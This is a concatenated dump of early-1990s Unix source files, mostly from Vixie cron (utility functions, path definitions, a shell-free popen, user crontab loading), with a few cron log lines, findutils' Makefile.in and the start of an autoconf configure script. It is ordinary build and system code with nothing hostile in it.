	int	ch;
	FILE	*file;
{
	ungetc(ch, file);
	if (ch == '\n')
		Set_LineNum(LineNumber - 1)
}


/* get_string(str, max, file, termstr) : like fgets() but
 *		(1) has terminator string which should include \n
 *		(2) will always leave room for the null
 *		(3) uses get_char() so LineNumber will be accurate
 *		(4) returns EOF or terminating character, whichever
 */
int
get_string(string, size, file, terms)
	char	*string;
	int	size;
	FILE	*file;
	char	*terms;
{
	int	ch;

	while (EOF != (ch = get_char(file)) && !strchr(terms, ch)) {
		if (size > 1) {
			*string++ = (char) ch;
			size--;
		}
	}

	if (size > 0)
		*string = '\0';

	return ch;
}


/* skip_comments(file) : read past comment (if any)
 */
void
skip_comments(file)
	FILE	*file;
{
	int	ch;

	while (EOF != (ch = get_char(file))) {
		/* ch is now the first character of a line.
		 */

		while (ch == ' ' || ch == '\t')
			ch = get_char(file);

		if (ch == EOF)
			break;

		/* ch is now the first non-blank character of a line.
		 */

		if (ch != '\n' && ch != '#')
			break;

		/* ch must be a newline or comment as first non-blank
		 * character on a line.
		 */

		while (ch != '\n' && ch != EOF)
			ch = get_char(file);

		/* ch is now the newline of a line which we're going to
		 * ignore.
		 */
	}
	if (ch != EOF)
		unget_char(ch, file);
}


/* int in_file(char *string, FILE *file)
 *	return TRUE if one of the lines in file matches string exactly,
 *	FALSE otherwise.
 */
static int
in_file(string, file)
	char *string;
	FILE *file;
{
	char line[MAX_TEMPSTR];

	rewind(file);
	while (fgets(line, MAX_TEMPSTR, file)) {
		if (line[0] != '\0')
			line[strlen(line)-1] = '\0';
		if (0 == strcmp(line, string))
			return TRUE;
	}
	return FALSE;
}


/* int allowed(char *username)
 *	returns TRUE if (ALLOW_FILE exists and user is listed)
 *	or (DENY_FILE exists and user is NOT listed)
 *	or (neither file exists but user=="root" so it's okay)
 */
int
allowed(username)
	char *username;
{
	static int	init = FALSE;
	static FILE	*allow, *deny;

	if (!init) {
		init = TRUE;
#if defined(ALLOW_FILE) && defined(DENY_FILE)
		allow = fopen(ALLOW_FILE, "r");
		deny = fopen(DENY_FILE, "r");
		Debug(DMISC, ("allow/deny enabled, %d/%d\n", !!allow, !!deny))
#else
		allow = NULL;
		deny = NULL;
#endif
	}

	if (allow)
		return (in_file(username, allow));
	if (deny)
		return (!in_file(username, deny));

#if defined(ALLOW_ONLY_ROOT)
	return (strcmp(username, ROOT_USER) == 0);
#else
	return TRUE;
#endif
}


void
log_it(username, xpid, event, detail)
	char	*username;
	int	xpid;
	char	*event;
	char	*detail;
{
	PID_T			pid = xpid;
#if defined(LOG_FILE)
	char			*msg;
	TIME_T			now = time((TIME_T) 0);
	register struct tm	*t = localtime(&now);
#endif /*LOG_FILE*/

#if defined(SYSLOG)
	static int		syslog_open = 0;
#endif

#if defined(LOG_FILE)
	/* we assume that MAX_TEMPSTR will hold the date, time, &punctuation.
	 */
	msg = malloc(strlen(username)
		     + strlen(event)
		     + strlen(detail)
		     + MAX_TEMPSTR);

	if (LogFD < OK) {
		LogFD = open(LOG_FILE, O_WRONLY|O_APPEND|O_CREAT, 0600);
		if (LogFD < OK) {
			fprintf(stderr, "%s: can't open log file\n",
				ProgramName);
			perror(LOG_FILE);
		} else {
			(void) fcntl(LogFD, F_SETFD, 1);
		}
	}

	/* we have to sprintf() it because fprintf() doesn't always write
	 * everything out in one chunk and this has to be atomically appended
	 * to the log file.
	 */
	sprintf(msg, "%s (%02d/%02d-%02d:%02d:%02d-%d) %s (%s)\n",
		username,
		t->tm_mon+1, t->tm_mday, t->tm_hour, t->tm_min, t->tm_sec, pid,
		event, detail);

	/* we have to run strlen() because sprintf() returns (char*) on old BSD
	 */
	if (LogFD < OK || write(LogFD, msg, strlen(msg)) < OK) {
		if (LogFD >= OK)
			perror(LOG_FILE);
		fprintf(stderr, "%s: can't write to log file\n", ProgramName);
		write(STDERR, msg, strlen(msg));
	}

	free(msg);
#endif /*LOG_FILE*/

#if defined(SYSLOG)
	if (!syslog_open) {
		/* we don't use LOG_PID since the pid passed to us by
		 * our client may not be our own.  therefore we want to
		 * print the pid ourselves.
		 */
# ifdef LOG_DAEMON
		openlog(ProgramName, LOG_PID, LOG_CRON);
# else
		openlog(ProgramName, LOG_PID);
# endif
		syslog_open = TRUE;		/* assume openlog success */
	}

	syslog(LOG_INFO, "(%s) %s (%s)\n", username, event, detail);

#endif /*SYSLOG*/

#if DEBUGGING
	if (DebugFlags) {
		fprintf(stderr, "log_it: (%s %d) %s (%s)\n",
			username, pid, event, detail);
	}
#endif
}


void
log_close() {
	if (LogFD != ERR) {
		close(LogFD);
		LogFD = ERR;
	}
}


/* two warnings:
 *	(1) this routine is fairly slow
 *	(2) it returns a pointer to static storage
 */
char *
first_word(s, t)
	register char *s;	/* string we want the first word of */
	register char *t;	/* terminators, implicitly including \0 */
{
	static char retbuf[2][MAX_TEMPSTR + 1];	/* sure wish C had GC */
	static int retsel = 0;
	register char *rb, *rp;

	/* select a return buffer */
	retsel = 1-retsel;
	rb = &retbuf[retsel][0];
	rp = rb;

	/* skip any leading terminators */
	while (*s && (NULL != strchr(t, *s))) {
		s++;
	}

	/* copy until next terminator or full buffer */
	while (*s && (NULL == strchr(t, *s)) && (rp < &rb[MAX_TEMPSTR])) {
		*rp++ = *s++;
	}

	/* finish the return-string and return it */
	*rp = '\0';
	return rb;
}


/* warning:
 *	heavily ascii-dependent.
 */
void
mkprint(dst, src, len)
	register char *dst;
	register unsigned char *src;
	register int len;
{
	while (len-- > 0)
	{
		register unsigned char ch = *src++;

		if (ch < ' ') {			/* control character */
			*dst++ = '^';
			*dst++ = ch + '@';
		} else if (ch < 0177) {		/* printable */
			*dst++ = ch;
		} else if (ch == 0177) {	/* delete/rubout */
			*dst++ = '^';
			*dst++ = '?';
		} else {			/* parity character */
			sprintf(dst, "\\%03o", ch);
			dst += 4;
		}
	}
	*dst = '\0';
}


/* warning:
 *	returns a pointer to malloc'd storage, you must call free yourself.
 */
char *
mkprints(src, len)
	register unsigned char *src;
	register unsigned int len;
{
	register char *dst = malloc(len*4 + 1);

	mkprint(dst, src, len);

	return dst;
}


#ifdef MAIL_DATE
/* Sat, 27 Feb 93 11:44:51 CST
 * 123456789012345678901234567
 */
char *
arpadate(clock)
	time_t *clock;
{
	time_t t = clock ?*clock :time(0L);
	struct tm *tm = localtime(&t);
	static char ret[30];	/* zone name might be >3 chars */
	
	(void) sprintf(ret, "%s, %2d %s %2d %02d:%02d:%02d %s",
		       DowNames[tm->tm_wday],
		       tm->tm_mday,
		       MonthNames[tm->tm_mon],
		       tm->tm_year,
		       tm->tm_hour,
		       tm->tm_min,
		       tm->tm_sec,
		       TZONE(*tm));
	return ret;
}
#endif /*MAIL_DATE*/


#ifdef HAVE_SAVED_SUIDS
static int save_euid;
int swap_uids() { save_euid = geteuid(); return seteuid(getuid()); }
int swap_uids_back() { return seteuid(save_euid); }
#else /*HAVE_SAVED_UIDS*/
int swap_uids() { return setreuid(geteuid(), getuid()); }
int swap_uids_back() { return swap_uids(); }
#endif /*HAVE_SAVED_UIDS*/
/* Copyright 1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

/*
 * $Id: pathnames.h,v 1.3 1994/01/15 20:43:43 vixie Exp $
 */

#if (defined(BSD)) && (BSD >= 199103) || defined(__linux) || defined(AIX)
# include <paths.h>
#endif /*BSD*/

#ifndef CRONDIR
			/* CRONDIR is where crond(8) and crontab(1) both chdir
			 * to; SPOOL_DIR, ALLOW_FILE, DENY_FILE, and LOG_FILE
			 * are all relative to this directory.
			 */
#define CRONDIR		"/var/cron"
#endif

			/* SPOOLDIR is where the crontabs live.
			 * This directory will have its modtime updated
			 * whenever crontab(1) changes a crontab; this is
			 * the signal for crond(8) to look at each individual
			 * crontab file and reload those whose modtimes are
			 * newer than they were last time around (or which
			 * didn't exist last time around...)
			 */
#define SPOOL_DIR	"tabs"

			/* undefining these turns off their features.  note
			 * that ALLOW_FILE and DENY_FILE must both be defined
			 * in order to enable the allow/deny code.  If neither
			 * LOG_FILE or SYSLOG is defined, we don't log.  If
			 * both are defined, we log both ways.
			 */
#define	ALLOW_FILE	"allow"		/*-*/
#define DENY_FILE	"deny"		/*-*/
#define LOG_FILE	"log"		/*-*/

			/* where should the daemon stick its PID?
			 */
#ifdef _PATH_VARRUN
# define PIDDIR	_PATH_VARRUN
#else
# define PIDDIR "/etc/"
#endif
#define PIDFILE		"%scron.pid"

			/* 4.3BSD-style crontab */
#define SYSCRONTAB	"/etc/crontab"

			/* what editor to use if no EDITOR or VISUAL
			 * environment variable specified.
			 */
#if defined(_PATH_VI)
# define EDITOR _PATH_VI
#else
# define EDITOR "/usr/ucb/vi"
#endif

#ifndef _PATH_BSHELL
# define _PATH_BSHELL "/bin/sh"
#endif

#ifndef _PATH_DEFPATH
# define _PATH_DEFPATH "/usr/bin:/bin"
#endif
/*
 * Copyright (c) 1988 The Regents of the University of California.
 * All rights reserved.
 *
 * This code is derived from software written by Ken Arnold and
 * published in UNIX Review, Vol. 6, No. 8.
 *
 * Redistribution and use in source and binary forms are permitted
 * provided that the above copyright notice and this paragraph are
 * duplicated in all such forms and that any documentation,
 * advertising materials, and other materials related to such
 * distribution and use acknowledge that the software was developed
 * by the University of California, Berkeley.  The name of the
 * University may not be used to endorse or promote products derived
 * from this software without specific prior written permission.
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

/* this came out of the ftpd sources; it's been modified to avoid the
 * globbing stuff since we don't need it.  also execvp instead of execv.
 */

#ifndef lint
static char rcsid[] = "$Id: popen.c,v 1.5 1994/01/15 20:43:43 vixie Exp $";
static char sccsid[] = "@(#)popen.c	5.7 (Berkeley) 2/14/89";
#endif /* not lint */

#include "cron.h"
#include <sys/signal.h>


#define WANT_GLOBBING 0

/*
 * Special version of popen which avoids call to shell.  This insures noone
 * may create a pipe to a hidden program as a side effect of a list or dir
 * command.
 */
static PID_T *pids;
static int fds;

FILE *
cron_popen(program, type)
	char *program, *type;
{
	register char *cp;
	FILE *iop;
	int argc, pdes[2];
	PID_T pid;
	char *argv[100];
#if WANT_GLOBBING
	char **pop, *vv[2];
	int gargc;
	char *gargv[1000];
	extern char **glob(), **copyblk();
#endif

	if (*type != 'r' && *type != 'w' || type[1])
		return(NULL);

	if (!pids) {
		if ((fds = getdtablesize()) <= 0)
			return(NULL);
		if (!(pids = (PID_T *)malloc((u_int)(fds * sizeof(PID_T)))))
			return(NULL);
		bzero((char *)pids, fds * sizeof(PID_T));
	}
	if (pipe(pdes) < 0)
		return(NULL);

	/* break up string into pieces */
	for (argc = 0, cp = program;; cp = NULL)
		if (!(argv[argc++] = strtok(cp, " \t\n")))
			break;

#if WANT_GLOBBING
	/* glob each piece */
	gargv[0] = argv[0];
	for (gargc = argc = 1; argv[argc]; argc++) {
		if (!(pop = glob(argv[argc]))) {	/* globbing failed */
			vv[0] = argv[argc];
			vv[1] = NULL;
			pop = copyblk(vv);
		}
		argv[argc] = (char *)pop;		/* save to free later */
		while (*pop && gargc < 1000)
			gargv[gargc++] = *pop++;
	}
	gargv[gargc] = NULL;
#endif

	iop = NULL;
	switch(pid = vfork()) {
	case -1:			/* error */
		(void)close(pdes[0]);
		(void)close(pdes[1]);
		goto pfree;
		/* NOTREACHED */
	case 0:				/* child */
		if (*type == 'r') {
			if (pdes[1] != 1) {
				dup2(pdes[1], 1);
				dup2(pdes[1], 2);	/* stderr, too! */
				(void)close(pdes[1]);
			}
			(void)close(pdes[0]);
		} else {
			if (pdes[0] != 0) {
				dup2(pdes[0], 0);
				(void)close(pdes[0]);
			}
			(void)close(pdes[1]);
		}
#if WANT_GLOBBING
		execvp(gargv[0], gargv);
#else
		execvp(argv[0], argv);
#endif
		_exit(1);
	}
	/* parent; assume fdopen can't fail...  */
	if (*type == 'r') {
		iop = fdopen(pdes[0], type);
		(void)close(pdes[1]);
	} else {
		iop = fdopen(pdes[1], type);
		(void)close(pdes[0]);
	}
	pids[fileno(iop)] = pid;

pfree:
#if WANT_GLOBBING
	for (argc = 1; argv[argc] != NULL; argc++) {
/*		blkfree((char **)argv[argc]);	*/
		free((char *)argv[argc]);
	}
#endif
	return(iop);
}

int
cron_pclose(iop)
	FILE *iop;
{
	register int fdes;
	int omask;
	WAIT_T stat_loc;
	PID_T pid;

	/*
	 * pclose returns -1 if stream is not associated with a
	 * `popened' command, or, if already `pclosed'.
	 */
	if (pids == 0 || pids[fdes = fileno(iop)] == 0)
		return(-1);
	(void)fclose(iop);
	omask = sigblock(sigmask(SIGINT)|sigmask(SIGQUIT)|sigmask(SIGHUP));
	while ((pid = wait(&stat_loc)) != pids[fdes] && pid != -1)
		;
	(void)sigsetmask(omask);
	pids[fdes] = 0;
	return (pid == -1 ? -1 : WEXITSTATUS(stat_loc));
}
#!/bin/sh

# putman.sh - install a man page according to local custom
# vixie 27dec93 [original]
#
# $Id:$

PAGE=$1
DIR=$2

SECT=`expr $PAGE : '[a-z]*.\([0-9]\)'`

[ -d $DIR/man$SECT ] && {
	set -x
	cp $PAGE $DIR/man$SECT/$PAGE
	set +x
} || {
	set -x
	nroff -man $PAGE >$DIR/cat$SECT/`basename $PAGE .$SECT`.0
	set +x
}

exit 0
/* Copyright 1988,1990,1993,1994 by Paul Vixie
 * All rights reserved
 *
 * Distribute freely, except: don't remove my name from the source or
 * documentation (don't take credit for my work), mark your changes (don't
 * get me blamed for your possible bugs), don't alter or remove this
 * notice.  May be sold if buildable source is provided to buyer.  No
 * warrantee of any kind, express or implied, is included with this
 * software; use at your own risk, responsibility for damages (if any) to
 * anyone resulting from the use of this software rests entirely with the
 * user.
 *
 * Send bug reports, bug fixes, enhancements, requests, flames, etc., and
 * I'll try to keep a version up to date.  I can be reached as follows:
 * Paul Vixie          <paul@vix.com>          uunet!decwrl!vixie!paul
 */

#if !defined(lint) && !defined(LINT)
static char rcsid[] = "$Id: user.c,v 2.8 1994/01/15 20:43:43 vixie Exp $";
#endif

/* vix 26jan87 [log is in RCS file]
 */


#include "cron.h"


void
free_user(u)
	user	*u;
{
	entry	*e, *ne;

	free(u->name);
	for (e = u->crontab;  e != NULL;  e = ne) {
		ne = e->next;
		free_entry(e);
	}
	free(u);
}


user *
load_user(crontab_fd, pw, name)
	int		crontab_fd;
	struct passwd	*pw;		/* NULL implies syscrontab */
	char		*name;
{
	char	envstr[MAX_ENVSTR];
	FILE	*file;
	user	*u;
	entry	*e;
	int	status;
	char	**envp;

	if (!(file = fdopen(crontab_fd, "r"))) {
		perror("fdopen on crontab_fd in load_user");
		return NULL;
	}

	Debug(DPARS, ("load_user()\n"))

	/* file is open.  build user entry, then read the crontab file.
	 */
	u = (user *) malloc(sizeof(user));
	u->name = strdup(name);
	u->crontab = NULL;

	/* 
	 * init environment.  this will be copied/augmented for each entry.
	 */
	envp = env_init();

	/*
	 * load the crontab
	 */
	while ((status = load_env(envstr, file)) >= OK) {
		switch (status) {
		case ERR:
			free_user(u);
			u = NULL;
			goto done;
		case FALSE:
			e = load_entry(file, NULL, pw, envp);
			if (e) {
				e->next = u->crontab;
				u->crontab = e;
			}
			break;
		case TRUE:
			envp = env_set(envp, envstr);
			break;
		}
	}

 done:
	env_free(envp);
	fclose(file);
	Debug(DPARS, ("...load_user() done\n"))
	return u;
}
CRON (11/02-00:49:33-1148) DEATH (can't lock /var/run/cron.pid, otherpid may be 1132: Try again)
CRON (11/02-01:03:28-1319) DEATH (can't lock /var/run/cron.pid, otherpid may be 1297: Try again)
CRON (11/04-11:54:06-271) DEATH (can't lock /var/run/cron.pid, otherpid may be 251: Try again)
CRON (11/04-12:00:17-309) DEATH (can't lock /var/run/cron.pid, otherpid may be 291: Try again)
CRON (11/04-12:24:51-443) DEATH (can't lock /var/run/cron.pid, otherpid may be 422: Try again)
56 13 * * * echo "normal going fiane" >/tmp/test
DIST_OTHER = COPYING ChangeLog TODO install-sh config.h.in stamp-h.in
SUBDIRS = lib find xargs locate doc testsuite
CONFIG_HEADER = config.h

distname:
	echo findutils-`sed -e '/version_string/!d' -e 's/[^0-9.]*\([0-9.]*\).*/\1/' -e q find/version.c` > $@
# Makefile.in generated automatically by automake from Makefile.am.
# Copyright (C) 1994 Free Software Foundation, Inc.

# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2, or (at your option)
# any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.

SHELL = /bin/sh

srcdir = @srcdir@
top_srcdir = @top_srcdir@
VPATH = @srcdir@
prefix = @prefix@
exec_prefix = @exec_prefix@

bindir = $(exec_prefix)/bin
sbindir = $(exec_prefix)/sbin
libexecdir = $(exec_prefix)/libexec
datadir = $(prefix)/share
sysconfdir = $(prefix)/etc
sharedstatedir = $(prefix)/com
localstatedir = $(prefix)/var
libdir = $(exec_prefix)/lib
infodir = $(prefix)/info
mandir = $(prefix)/man
includedir = $(prefix)/include
oldincludedir = /usr/include

INSTALL = @INSTALL@
INSTALL_PROGRAM = @INSTALL_PROGRAM@
INSTALL_DATA = @INSTALL_DATA@
transform = @program_transform_name@

ALL = ${PROGRAMS} ${LIBPROGRAMS} ${SCRIPTS} ${LIBSCRIPTS} ${LIBFILES}
ACCONFIG = acconfig.h
SOURCES = 
DIST_CONF = Makefile.am Makefile.in README INSTALL NEWS \
	configure configure.in ${ACLOCAL} ${ACCONFIG} ${CONFIG_TOP} \
	${CONFIG_BOT} mkinstalldirs
DIST_FILES = $(DIST_CONF) $(SOURCES) $(TEXINFOS) $(INFOS) $(MANS) $(DIST_OTHER)

DIST_OTHER = COPYING ChangeLog TODO install-sh config.h.in stamp-h.in
SUBDIRS = lib find xargs locate doc testsuite
CONFIG_HEADER = config.h

all:: ${ALL}

# This directory's subdirectories are mostly independent; you can cd
# into them and run `make' without going through this Makefile.
# To change the values of `make' variables: instead of editing Makefiles,
# (1) if the variable is set in `config.status', edit `config.status'
#     (which will cause the Makefiles to be regenerated when you run `make');
# (2) otherwise, pass the desired values on the `make' command line.

@SET_MAKE@

all install install-info uninstall check tags TAGS info dvi::
	for subdir in $(SUBDIRS); do \
	  echo making $@ in $$subdir ; \
	  (cd $$subdir; $(MAKE) $@); \
	done

mostlyclean: mostlyclean-recursive mostlyclean-local

clean: clean-recursive clean-local

distclean: distclean-recursive
	$(MAKE) distclean-local
	       
realclean: realclean-recursive
	$(MAKE) realclean-local

mostlyclean-recursive clean-recursive distclean-recursive realclean-recursive:
	for subdir in $(SUBDIRS); do \
	  (cd $$subdir; $(MAKE) `echo $@ | sed s/-recursive//`); \
	done

mostlyclean-local:

clean-local: mostlyclean-local

distclean-local: clean-local
	rm -f Makefile config.cache config.log config.status
	rm -f ${CONFIG_HEADER} stamp-h

realclean-local: distclean-local

# For an explanation of the following Makefile rules, see node
# `Automatic Remaking' in GNU Autoconf documentation.
Makefile: Makefile.in config.status
	CONFIG_FILES=$@ CONFIG_HEADERS= ./config.status
config.status: configure
	./config.status --recheck
${srcdir}/configure: configure.in ${ACLOCAL}
	cd $(srcdir); autoconf

${CONFIG_HEADER}: stamp-h
stamp-h: ${CONFIG_HEADER}.in config.status
	CONFIG_FILES= CONFIG_HEADERS=${CONFIG_HEADER} ./config.status
${srcdir}/${CONFIG_HEADER}.in: stamp-h.in
${srcdir}/stamp-h.in: configure.in ${ACLOCAL} ${ACCONFIG} ${CONFIG_TOP} ${CONFIG_BOT}
	cd $(srcdir); autoheader
	date > $(srcdir)/stamp-h.in

dist: $(DIST_FILES) $(DIST_DIRS) distname
	rm -rf `cat distname`; mkdir `cat distname`
	@for file in $(DIST_FILES); do \
	  echo linking $$file; \
	  ln $(srcdir)/$$file `cat distname`/$$file || \
	    { echo copying $$file instead; cp -p $(srcdir)/$$file `cat distname`/$$file;}; \
	done
	for subdir in $(SUBDIRS); do \
	  (cd $$subdir; $(MAKE) subdir=$$subdir $@); done
	chmod -R a+r `cat distname`
	tar -chozf `cat distname`.tar.gz `cat distname`
	rm -rf `cat distname` distname

check dvi info install uninstall::

tags:: TAGS

TAGS::
	cd $(srcdir); etags $(SOURCES)

# Tell versions [3.59,3.63) of GNU make to not export all variables.
# Otherwise a system limit (for SysV at least) may be exceeded.
.NOEXPORT:

distname:
	echo findutils-`sed -e '/version_string/!d' -e 's/[^0-9.]*\([0-9.]*\).*/\1/' -e q find/version.c` > $@
#!/bin/sh

# Guess values for system-dependent variables and create Makefiles.
# Generated automatically using autoconf version 2.1 
# Copyright (C) 1992, 1993, 1994 Free Software Foundation, Inc.
#
# This configure script is free software; the Free Software Foundation
# gives unlimited permission to copy, distribute and modify it.

# Defaults:
ac_help=
ac_default_prefix=/usr/local
# Any additions from configure.in:
ac_help="$ac_help
  --enable-id-cache       cache all UIDs & GIDs; avoid if using NIS or Hesiod"
ac_help="$ac_help
  --with-afs              support -fstype afs"

# Initialize some variables set by options.
# The variables have the same names as the options, with
# dashes changed to underlines.
build=NONE
cache_file=./config.cache
exec_prefix=NONE
host=NONE
no_create=
nonopt=NONE
no_recursion=
prefix=NONE
program_prefix=NONE
program_suffix=NONE
program_transform_name=s,x,x,
silent=
site=
srcdir=
target=NONE
verbose=
x_includes=NONE
x_libraries=NONE

# Initialize some other variables.
subdirs=

ac_prev=
for ac_option
do

  # If the previous option needs an argument, assign it.
  if test -n "$ac_prev"; then
    eval "$ac_prev=\$ac_option"
    ac_prev=
    continue
  fi

  case "$ac_option" in
  -*=*) ac_optarg=`echo "$ac_option" | sed 's/[-_a-zA-Z0-9]*=//'` ;;
  *) ac_optarg= ;;
  esac

  # Accept the important Cygnus configure options, so we can diagnose typos.

  case "$ac_option" in

  -build | --build | --buil | --bui | --bu | --b)
    ac_prev=build ;;
  -build=* | --build=* | --buil=* | --bui=* | --bu=* | --b=*)
    build="$ac_optarg" ;;

  -cache-file | --cache-file | --cache-fil | --cache-fi \
  | --cache-f | --cache- | --cache | --cach | --cac | --ca | --c)
    ac_prev=cache_file ;;
  -cache-file=* | --cache-file=* | --cache-fil=* | --cache-fi=* \
  | --cache-f=* | --cache-=* | --cache=* | --cach=* | --cac=* | --ca=* | --c=*)
    cache_file="$ac_optarg" ;;

  -disable-* | --disable-*)
    ac_feature=`echo $ac_option|sed -e 's/-*disable-//'`
    # Reject names that are not valid shell variable names.
    if test -n "`echo $ac_feature| sed 's/[-a-zA-Z0-9_]//g'`"; then
      { echo "configure: error: $ac_feature: invalid feature name" 1>&2; exit 1; }
    fi
    ac_feature=`echo $ac_feature| sed 's/-/_/g'`
    eval "enable_${ac_feature}=no" ;;

  -enable-* | --enable-*)
    ac_feature=`echo $ac_option|sed -e 's/-*enable-//' -e 's/=.*//'`
    # Reject names that are not valid shell variable names.
    if test -n "`echo $ac_feature| sed 's/[-_a-zA-Z0-9]//g'`"; then
      { echo "configure: error: $ac_feature: invalid feature name" 1>&2; exit 1; }
    fi
    ac_feature=`echo $ac_feature| sed 's/-/_/g'`
    case "$ac_option" in
      *=*) ;;
      *) ac_optarg=yes ;;
    esac
    eval "enable_${ac_feature}='$ac_optarg'" ;;

  -exec-prefix | --exec_prefix | --exec-prefix | --exec-prefi \
  | --exec-pref | --exec-pre | --exec-pr | --exec-p | --exec- \
  | --exec | --exe | --ex)
    ac_prev=exec_prefix ;;
  -exec-prefix=* | --exec_prefix=* | --exec-prefix=* | --exec-prefi=* \
  | --exec-pref=* | --exec-pre=* | --exec-pr=* | --exec-p=* | --exec-=* \
  | --exec=* | --exe=* | --ex=*)
    exec_prefix="$ac_optarg" ;;

  -gas | --gas | --ga | --g)
    # Obsolete; use --with-gas.
    with_gas=yes ;;

  -help | --help | --hel | --he)
    # Omit some internal or obsolete options to make the list less imposing.
    # This message is too long to be a string in the A/UX 3.1 sh.
    cat << EOF
Usage: configure [options] [host]
Options: [defaults in brackets after descriptions]
Configuration:
  --cache-file=FILE       cache test results in FILE
  --help                  print this message
  --no-create             do not create output files
  --quiet, --silent       do not print \`checking...' messages
  --version               print the version of autoconf that created configure
Directory and file names:
  --prefix=PREFIX         install architecture-independent files in PREFIX
                          [$ac_default_prefix]
  --exec-prefix=PREFIX    install architecture-dependent files in PREFIX
                          [same as prefix]
  --srcdir=DIR            find the sources in DIR [configure dir or ..]
  --program-prefix=PREFIX prepend PREFIX to installed program names
  --program-suffix=SUFFIX append SUFFIX to installed program names
  --program-transform-name=PROGRAM run sed PROGRAM on installed program names
Host type:
  --build=BUILD           configure for building on BUILD [BUILD=HOST]
  --host=HOST             configure for HOST [guessed]
  --target=TARGET         configure for TARGET [TARGET=HOST]
Features and packages:
  --disable-FEATURE       do not include FEATURE (same as --enable-FEATURE=no)
  --enable-FEATURE[=ARG]  include FEATURE [ARG=yes]
  --with-PACKAGE[=ARG]    use PACKAGE [ARG=yes]
  --without-PACKAGE       do not use PACKAGE (same as --with-PACKAGE=no)
  --x-includes=DIR        X include files are in DIR
  --x-libraries=DIR       X library files are in DIR
--enable and --with options recognized:$ac_help
EOF
    exit 0 ;;

  -host | --host | --hos | --ho)
    ac_prev=host ;;
  -host=* | --host=* | --hos=* | --ho=*)
    host="$ac_optarg" ;;

  -nfp | --nfp | --nf)
    # Obsolete; use --without-fp.
    with_fp=no ;;

  -no-create | --no-create | --no-creat | --no-crea | --no-cre \
  | --no-cr | --no-c)
    no_create=yes ;;

  -no-recursion | --no-recursion | --no-recursio | --no-recursi \
  | --no-recurs | --no-recur | --no-recu | --no-rec | --no-re | --no-r)
    no_recursion=yes ;;

  -prefix | --prefix | --prefi | --pref | --pre | --pr | --p)
    ac_prev=prefix ;;
  -prefix=* | --prefix=* | --prefi=* | --pref=* | --pre=* | --pr=* | --p=*)
    prefix="$ac_optarg" ;;

  -program-prefix | --program-prefix | --program-prefi | --program-pref \
  | --program-pre | --program-pr | --program-p)
    ac_prev=program_prefix ;;
  -program-prefix=* | --program-prefix=* | --program-prefi=* \
  | --program-pref=* | --program-pre=* | --program-pr=* | --program-p=*)
    program_prefix="$ac_optarg" ;;

  -program-suffix | --program-suffix | --program-suffi | --program-suff \
  | --program-suf | --program-su | --program-s)
    ac_prev=program_suffix ;;
  -program-suffix=* | --program-suffix=* | --program-suffi=* \
  | --program-suff=* | --program-suf=* | --program-su=* | --program-s=*)
    program_suffix="$ac_optarg" ;;

  -program-transform-name | --program-transform-name \
  | --program-transform-nam | --program-transform-na \
  | --program-transform-n | --program-transform- \
  | --program-transform | --program-transfor \
  | --program-transfo | --program-transf \
  | --program-trans | --program-tran \
  | --progr-tra | --program-tr | --program-t)
    ac_prev=program_transform_name ;;
  -program-transform-name=* | --program-transform-name=* \
  | --program-transform-nam=* | --program-transform-na=* \
  | --program-transform-n=* | --program-transform-=* \
  | --program-transform=* | --program-transfor=* \
  | --program-transfo=* | --program-transf=* \
  | --program-trans=* | --program-tran=* \
  | --progr-tra=* | --program-tr=* | --program-t=*)
    program_transform_name="$ac_optarg" ;;

  -q | -quiet | --quiet | --quie | --qui | --qu | --q \
  | -silent | --silent | --silen | --sile | --sil)
    silent=yes ;;

  -site | --site | --sit)
    ac_prev=site ;;
  -site=* | --site=* | --sit=*)
    site="$ac_optarg" ;;

  -srcdir | --srcdir | --srcdi | --srcd | --src | --sr)
    ac_prev=srcdir ;;
  -srcdir=* | --srcdir=* | --srcdi=* | --srcd=* | --src=* | --sr=*)
    srcdir="$ac_optarg" ;;

  -target | --target | --targe | --targ | --tar | --ta | --t)
    ac_prev=target ;;
  -target=* | --target=* | --targe=* | --targ=* | --tar=* | --ta=* | --t=*)
    target="$ac_optarg" ;;

  -v | -verbose | --verbose | --verbos | --verbo | --verb)
    verbose=yes ;;

  -version | --version | --versio | --versi | --vers)
    echo "configure generated by autoconf version 2.1"
    exit 0 ;;

  -with-* | --with-*)
    ac_package=`echo $ac_option|sed -e 's/-*with-//' -e 's/=.*//'`
    # Reject names that are not valid shell variable names.
    if test -n "`echo $ac_package| sed 's/[-_a-zA-Z0-9]//g'`"; then
      { echo "configure: error: $ac_package: invalid package name" 1>&2; exit 1; }
    fi
    ac_package=`echo $ac_package| sed 's/-/_/g'`
    case "$ac_option" in
      *=*) ;;
      *) ac_optarg=yes ;;
    esac
    eval "with_${ac_package}='$ac_optarg'" ;;

  -without-* | --without-*)
    ac_package=`echo $ac_option|sed -e 's/-*without-//'`
    # Reject names that are not valid shell variable names.
    if test -n "`echo $ac_package| sed 's/[-a-zA-Z0-9_]//g'`"; then
      { echo "configure: error: $ac_package: invalid package name" 1>&2; exit 1; }
    fi
    ac_package=`echo $ac_package| sed 's/-/_/g'`
    eval "with_${ac_package}=no" ;;

  --x)
    # Obsolete; use --with-x.
    with_x=yes ;;

  -x-includes | --x-includes | --x-include | --x-includ | --x-inclu \
  | --x-incl | --x-inc | --x-in | --x-i)
    ac_prev=x_includes ;;
